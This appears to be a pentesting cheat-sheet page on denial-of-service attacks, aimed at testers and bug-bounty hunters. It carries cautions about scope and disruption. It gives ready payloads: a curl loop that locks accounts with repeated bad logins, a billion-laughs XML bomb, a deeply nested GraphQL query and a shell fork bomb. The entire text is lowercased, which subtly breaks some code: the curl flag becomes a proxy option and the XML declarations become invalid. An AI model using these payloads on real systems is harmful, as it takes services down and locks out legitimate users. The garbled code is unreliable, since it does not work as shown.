# denial of service

> a denial of service (dos) attack aims to make a service unavailable by overwhelming it with a flood of illegitimate requests or exploiting vulnerabilities in the target's software to crash or degrade performance. in a distributed denial of service (ddos), attackers use multiple sources (often compromised machines) to perform the attack simultaneously.

## summary

* [methodology](#methodology)
    * [locking customer accounts](#locking-customer-accounts)
    * [file limits on filesystem](#file-limits-on-filesystem)
    * [memory exhaustion - technology related](#memory-exhaustion---technology-related)
* [references](#references)

## methodology

here are some examples of denial of service (dos) attacks. these examples should serve as a reference for understanding the concept, but any dos testing should be conducted cautiously, as it can disrupt the target environment and potentially result in loss of access or exposure of sensitive data.

### locking customer accounts

example of denial of service that can occur when testing customer accounts.
be very careful as this is most likely **out-of-scope** and can have a high impact on the business.

* multiple attempts on the login page when the account is temporary/indefinitely banned after x bad attempts.

    ```ps1
    for i in {1..100}; do curl -x post -d "username=user&password=wrong" <target_login_url>; done
    ```

### file limits on filesystem

when a process is writing a file on the server, try to reach the maximum number of files allowed by the filesystem format. the system should output a message: `no space left on device` when the limit is reached.

| filesystem | maximum inodes |
| ---        | --- |
| btrfs      | 2^64 (~18 quintillion) |
| ext4       | ~4 billion |
| fat32      | ~268 million files |
| ntfs       | ~4.2 billion (mft entries) |
| xfs        | dynamic (disk size) |
| zfs        | ~281 trillion |

an alternative of this technique would be to fill a file used by the application until it reaches the maximum size allowed by the filesystem, for example it can occur on a sqlite database or a log file.

fat32 has a significant limitation of **4 gb**, which is why it's often replaced with exfat or ntfs for larger files.

modern filesystems like btrfs, zfs, and xfs support exabyte-scale files, well beyond current storage capacities, making them future-proof for large datasets.

### memory exhaustion - technology related

depending on the technology used by the website, an attacker may have the ability to trigger specific functions or paradigm that will consume a huge chunk of memory.

* **xml external entity**: billion laughs attack/xml bomb

    ```xml
    <?xml version="1.0"?>
    <!doctype lolz [
    <!entity lol "lol">
    <!element lolz (#pcdata)>
    <!entity lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!entity lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!entity lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!entity lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!entity lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!entity lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!entity lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!entity lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!entity lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>
    ```

* **graphql**: deeply-nested graphql queries.

    ```ps1
    query { 
        repository(owner:"rails", name:"rails") {
            assignableusers (first: 100) {
                nodes {
                    repositories (first: 100) {
                        nodes {
                            
                        }
                    }
                }
            }
        }
    }
    ```

* **image resizing**: try to send invalid pictures with modified headers, e.g: abnormal size, big number of pixels.
* **svg handling**: svg file format is based on xml, try the billion laughs attack.
* **regular expression**: redos
* **fork bomb**: rapidly creates new processes in a loop, consuming system resources until the machine becomes unresponsive.

    ```ps1
    :(){ :|:& };:
    ```

## references

* [def con 32 - practical exploitation of dos in bug bounty - roni lupin carta - october 16, 2024](https://youtu.be/b7wluofpjpu)
* [denial of service cheat sheet - owasp cheat sheet series - july 16, 2019](https://cheatsheetseries.owasp.org/cheatsheets/denial_of_service_cheat_sheet.html)
